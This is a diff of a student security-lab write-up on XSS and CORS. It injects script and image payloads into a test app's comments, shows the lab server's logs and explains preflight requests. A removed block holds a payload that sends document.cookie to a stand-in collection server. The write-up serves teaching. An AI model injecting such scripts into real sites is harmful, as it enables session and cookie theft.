@@ -1,4 +1,4 @@
-﻿# Lab 1 - SIO 
+﻿# Lab 2 - SIO 
 # Vulnerabilities in Web Applications: XSS
 
 
@@ -137,28 +137,166 @@ The additional server will simulate a service being exploited by an XSS attack, 
 Now lets inject payloads as messages in the app's posts' comments in order to test the diﬀerent paths in the CORS ﬂow. 
 We can observe what is loaded by looking at the browser console, and the server console. Take in consideration that the browser may issue background requests that are not displayed in the network view, but logged by the server!
 
+The following snippet can be used to simulate different requests from within Javascript.
+```
+$.ajax({
+url: 'http://external:8000/smile.jpg',
+type: 'GET',
+success: function() { alert("smile.jpg loaded"); },
+});
+```
+
 ##### GET in Image tag: 
 - Add a direct GET of an image by using the < img > tag. The server has an image named smile.jpg. 
 We can do this by adding:
 ```
-<img src="external:8000/smile.jpg></img>
+<img src="http://external:8000/smile.jpg"></img>
 ```
-To a comment. This will, in the app's page, load the smile.jpg image
+To a comment. This will, in the app's page, load the smile.jpg image.
+The external server's console will also output:
+```
+127.0.0.1 - - [05/Oct/2019 16:13:03] "GET /smile.jpg HTTP/1.1" 200 -
+Serving file: smile.jpg
+Request Debug:  GET
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://internal:6543/post/0
+
+```
+And we can see that the image was successfully retrieved since it actually loads in the comment of our internal server!
 
 ##### GET in JS: 
 - Obtain the same resource but use the previous Javascript snippet. Observe that the browser will request the image, but will refuse to use it. 
-
-##### GET in JS with headers:
-- Repeat the request but add: ,headers={"My-Header": "myvalue"} to the ajax request. The behaviour should be similar to the previous case.
+By inputting: 
 ```
 <script>
 	$.ajax({
-	        url: 'http://localhost:8000/cookie',
-		type: 'POST',
-		data: "username=Administrator;cookie=a"+document.cookie,
-	})
+		url: 'http://external:8000/smile.jpg',
+		type: 'GET',
+		success: function() { alert("smile.jpg loaded"); },
+	});
 </script>
 ```
+We will get the following output in the server's console:
+```
+127.0.0.1 - - [05/Oct/2019 16:24:46] "GET /smile.jpg HTTP/1.1" 200 -
+Serving file: smile.jpg
+Request Debug:  GET
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Origin: http://internal:6543
+Connection: keep-alive
+Referer: http://internal:6543/post/2
+Cache-Control: max-age=0
+```
+Unfortunately, since the alert message didnt pop up, this means that the image was NOT successfully retrieved :( !
+##### GET in JS with headers:
+- Repeat the request but add: ,headers={"My-Header": "myvalue"} to the ajax request. The behavior should be similar to the previous case.
+By inputting: 
+```
+<script>
+	$.ajax({
+		url: 'http://external:8000/smile.jpg',
+		type: 'GET',
+		success: function() { alert("smile.jpg loaded"); },
+		headers:{"My-Header": "myvalue"},
+	});
+</script>
+```
+We will get the following output in the server's console:
+```
+127.0.0.1 - - [05/Oct/2019 16:32:49] code 501, message Unsupported method ('OPTIONS')
+127.0.0.1 - - [05/Oct/2019 16:32:49] "OPTIONS /smile.jpg HTTP/1.1" 501 -
+Request Debug:  OPTIONS
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Access-Control-Request-Method: GET
+Access-Control-Request-Headers: my-header
+Referer: http://internal:6543/post/1
+Origin: http://internal:6543
+Connection: keep-alive
+```
+Which is indeed very similar to the error we got on the last exercise.
+Unfortunately, since the alert message didnt pop up, this means that the image was NOT successfully retrieved :( ! (same as before)
+
+###
+###
+Note that, the reason why the first exercise's request was issued while the last 2 were denied is due to the fact that our **external server** doesn't allow it's resources be shared (i.e loaded) from externa sites (i.e our **interal server**). This will avoid indirect calls from users that were tricked into being a surrogate of an XSS payload.
+
+But let's be honest, because we are dealing with images, they do not pose a threat, and we can actually allow these resources to be obtained without that posing any risks to us. In order to do this, we can **add a header Access-Control-Allow-Origin stating that every website can include the images from our own**. 
+
+To do this in our external server, check the file _cors_server.py_ and uncomment the code
+around line 20. Then repeat the previous tests.
+
+##### GET in Image tag: 
+New output:
+```
+127.0.0.1 - - [05/Oct/2019 16:38:38] "GET /smile.jpg HTTP/1.1" 200 -
+Serving file: smile.jpg
+Request Debug:  GET
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://internal:6543/post/0
+```
+**Success - Image is shown**
+
+##### GET in JS: 
+New output:
+```
+127.0.0.1 - - [05/Oct/2019 16:42:10] "GET /smile.jpg HTTP/1.1" 200 -
+Serving file: smile.jpg
+Request Debug:  GET
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Origin: http://internal:6543
+Connection: keep-alive
+Referer: http://internal:6543/post/1
+```
+**Success - Alert success message pops up!**
+
+##### GET in JS with headers:
+New output:
+```
+127.0.0.1 - - [05/Oct/2019 16:46:10] code 501, message Unsupported method ('OPTIONS')
+127.0.0.1 - - [05/Oct/2019 16:46:10] "OPTIONS /smile.jpg HTTP/1.1" 501 -
+Request Debug:  OPTIONS
+Host: external:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Access-Control-Request-Method: GET
+Access-Control-Request-Headers: my-header
+Referer: http://internal:6543/post/1
+Origin: http://internal:6543
+Connection: keep-alive
+```
+**Failure - Alert message doesn't pop up! :(**
+
+The final test was still unsuccessful! This is because a GET with additional
+headers can be used to trigger authenticated actions (user authentication
+uses headers). Therefore, the browser will first check if the request can be
+made by issuing an OPTIONS request. The result of this request should be
+the access policy (Access-Control-Allow-Origin), and the list of methods
+supported (Access-Control-Allow-Methods with each method separated
+by a comma).
 
 # References
 https://joao.barraca.pt/teaching/sio/2019/p/guide-vulnerabilities-xss.pdf
